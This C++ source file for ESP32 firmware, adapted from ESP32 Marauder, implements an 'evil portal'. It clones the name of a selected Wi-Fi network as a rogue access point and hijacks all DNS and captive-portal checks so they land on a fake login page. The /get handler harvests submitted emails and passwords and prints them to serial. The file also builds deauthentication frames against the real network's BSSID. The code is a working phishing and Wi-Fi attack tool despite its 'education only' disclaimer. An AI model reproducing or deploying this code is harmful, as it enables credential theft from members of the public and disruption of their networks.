#include "evilportalheader.h"

/*
     * evilportal.cpp (Based ESP32 Marauder by @justcallmekoko)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

AsyncWebServer server(80);
DNSServer dnsServer;
const IPAddress AP_IP(172, 0, 0, 1);

class CaptiveRequestHandler : public AsyncWebHandler {
    public:
        CaptiveRequestHandler() {}
        virtual ~CaptiveRequestHandler() {}

        bool canHandle(AsyncWebServerRequest *request) { return true; }

        void handleRequest(AsyncWebServerRequest *request) {
            request->send(200, "text/html", index_html);
        }
};

WiFiModules wifi_obj;

uint8_t deauth_frame[sizeof(wifi_obj.deauth_frame_packet)];


EvilPortalAddtional::EvilPortalAddtional() 
{
}

String EvilPortalAddtional::get_password() {
    return this->password;
}

String EvilPortalAddtional::get_user_name() {
    return this->user_name;
}

void EvilPortalAddtional::shutdownServer() {
    this->runServer = false;
    server.end();
    dnsServer.stop();
    WiFi.disconnect();
    Serial.println("[INFO] Successfully Shutdown Portal");
}

void EvilPortalAddtional::main() {
    this->runServer = false;
    this->name_received = false;
    this->password_received = false;
    this->has_html = false;
    this->has_ap = false;

    //html_files = new LinkedList<String>();

    Serial.println("[INFO] Successfully setup Evil Portal");
}

void EvilPortalAddtional::loop() {
    if (this->has_ap && this->has_html) {
        dnsServer.processNextRequest();
        if (this->name_received && this->password_received) {
            this->name_received = false;
            this->password_received = false;
            Serial.println("[INFO] User Name: " + user_name);
            Serial.println("[INFO] Password: " + password);
        }
    }
}

void EvilPortalAddtional::serverSetup() {

    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(200, "text/html", index_html);
        Serial.println("[INFO] Successfully connected server with client");
    });

    
    const char* captiveEndpoints[] = {
        "/hotspot-detect.html",
        "/library/test/success.html",
        "/success.txt",
        "/generate_204",
        "/gen_204",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect"
    };

    for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
        server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
            request->send(200, "text/html", index_html);
        });
    }

    server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", WiFi.softAPSSID());
    });

    server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
        String inputMessage;

        if (request->hasParam("email")) {
        inputMessage = request->getParam("email")->value();
        this->user_name = inputMessage;
        this->name_received = true;
        }

        if (request->hasParam("password")) {
        inputMessage = request->getParam("password")->value();
        this->password = inputMessage;
        this->password_received = true;
        }

        request->send(
        200, "text/html",
        "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
    });
    Serial.println("[INFO] Server request READY!");
}

bool EvilPortalAddtional::htmlSetup() {
    Serial.println("[WARN] No have html file exists, using default html file instead");
    strlcpy(index_html, default_html, strlen(default_html));
    this->has_html = true;
    Serial.println("[INFO] Set html file successfully");
    return true;
}

bool EvilPortalAddtional::apSetup(String essid, bool _deauth) {
    String ap_name = "";
    user_name = "";
    password = "";
    if (essid == "") {
        for (int i = 0; i < access_points->size(); i++) {
            if (access_points->get(i).selected) {
                if (_deauth) {
                    memcpy(deauth_frame, wifi_obj.deauth_frame_packet, sizeof(wifi_obj.deauth_frame_packet));
                    esp_wifi_set_channel(access_points->get(i).channel, WIFI_SECOND_CHAN_NONE);
                    vTaskDelay(50 / portTICK_PERIOD_MS);
                    deauth_frame[10] = access_points->get(i).bssid[0];
                    deauth_frame[11] = access_points->get(i).bssid[1];
                    deauth_frame[12] = access_points->get(i).bssid[2];
                    deauth_frame[13] = access_points->get(i).bssid[3];
                    deauth_frame[14] = access_points->get(i).bssid[4];
                    deauth_frame[15] = access_points->get(i).bssid[5];
                
                    deauth_frame[16] = access_points->get(i).bssid[0];
                    deauth_frame[17] = access_points->get(i).bssid[1];
                    deauth_frame[18] = access_points->get(i).bssid[2];
                    deauth_frame[19] = access_points->get(i).bssid[3];
                    deauth_frame[20] = access_points->get(i).bssid[4];
                    deauth_frame[21] = access_points->get(i).bssid[5];
                }
                ap_name = access_points->get(i).essid;
                break;
            }
        }
    } else {
        ap_name = essid;
    }
    
    if (ap_name == "") {
        Serial.println("[WARN] Cannot get selected AP Name, using default name instead");
        ap_name = espatsettings.evilportalSSID;
    }

    if (ap_name.length() > MAX_AP_NAME_SIZE) {
        Serial.println("[ERROR] Failed to set AP because The given AP is too large");
        Serial.println("[ERROR] AP Name Byte Limit: " + String(MAX_AP_NAME_SIZE));
        return false;
    }
    
    if (ap_name != "") {
        strncpy(evilapName, ap_name.c_str(), MAX_AP_NAME_SIZE);
        this->has_ap = true;
        Serial.println("[INFO] AP set successfully");
        return true;
    }
    else {
        return false;
    }
}

void EvilPortalAddtional::apStart() {

    Serial.print("[INFO] Starting AP as name: ");
    Serial.println(evilapName);

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(evilapName);

    Serial.print("[INFO] Ip address: ");
    Serial.println(WiFi.softAPIP());

    this->serverSetup();

    dnsServer.start(53, "*", WiFi.softAPIP());
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    this->runServer = true;
    Serial.println("[INFO] Evil Portal Started Successfully");
    Serial.println("[INFO] Evil Portal READY!");
}